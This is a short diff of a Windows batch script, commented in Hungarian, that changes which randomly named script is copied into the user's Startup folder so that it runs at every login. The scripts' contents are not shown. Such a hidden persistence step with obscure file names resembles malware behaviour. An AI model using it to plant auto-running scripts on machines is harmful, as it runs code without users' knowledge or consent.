@@ -98,7 +98,8 @@ if not exist "%STARTUP_FOLDER%" (
 )
 
 :: .py fájlok bemásolása Startupba
-copy "%~dp0spwww743g7w.py" "%STARTUP_FOLDER%\sifustartup5sfgj.vbs" /Y >nul
+copy "%~dp0sifustartup5sfgj.vbs" "%STARTUP_FOLDER%\sifustartup5sfgj.vbs.vbs" /Y >nul
 
 echo Kész.
 pause
+
